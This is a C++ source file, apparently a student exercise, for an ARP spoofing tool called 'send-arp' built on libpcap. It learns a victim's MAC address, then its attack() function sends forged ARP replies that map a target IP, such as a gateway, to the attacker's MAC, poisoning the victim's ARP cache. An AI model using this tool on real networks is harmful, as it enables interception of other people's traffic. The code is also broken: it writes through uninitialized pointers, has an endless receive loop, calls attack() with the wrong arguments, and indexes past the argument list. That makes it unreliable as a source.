#include <cstdio>
#include <pcap.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <stdint.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int get_myinfo(uint8_t* mac, char* ip, char* interface){
    int sock;
    struct ifreq ifr;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0){
        fprintf(stderr, "Fail to get interface MAC address - socket() failed - %m\n");
        return -1;
    }

    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr)<0){
        fprintf(stderr, "Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
        close(sock);
        return -1;
    }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);

    if (ioctl(sock, SIOCGIFADDR, &ifr)<0){
        fprintf(stderr, "Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
        close(sock);
        return -1;
    }

    inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ip, sizeof(struct sockaddr));

    close(sock);

    printf("Sucess to get interface(%s) MAC address");
    return 0;
}

int get_smac(Mac& smac, Ip& sip, Ip& myip, Mac& mymac, pcap_t* handle){
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = mymac;

    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = mymac;
    packet.arp_.sip_ = htonl(myip);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(sip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
            fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        EthArpPacket* reply = (EthArpPacket*)packet;
        if (reply->eth_.type_ != htons(EthHdr::Arp)) continue;
        if (reply->arp_.op_ != htons(ArpHdr::Reply)) continue;

        smac = Mac(reply->arp_.smac_);
        printf("ARP replied\n");

    }
}

int attack(Ip& tip, Mac& smac, Ip& sip, Ip& myip, Mac& mymac, pcap_t* handle){
    EthArpPacket packet;

    packet.eth_.dmac_ = smac;
    packet.eth_.smac_ = mymac;

    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = mymac;
    packet.arp_.sip_ = htonl(tip);
    packet.arp_.tmac_ = smac;
    packet.arp_.tip_ = htonl(sip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    return 0;
}

int main(int argc, char* argv[]) {
    if (argc < 3 || argc % 2 == 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    // get my info
    uint8_t* mac;
    char* ip;

    get_myinfo(mac, ip, argv[1]);
    Mac mymac(mac);
    Ip myip(ip);

    for (int i=1;i<=argc;i+=2){
        // get sender info
        Ip sip = Ip(argv[i]);
        Mac smac;
        get_smac(smac, sip, myip, mymac, handle);

        Ip tip(argv[i+1]);
        Mac tmac;
        attack(tip);
    }
    pcap_close(handle);
}
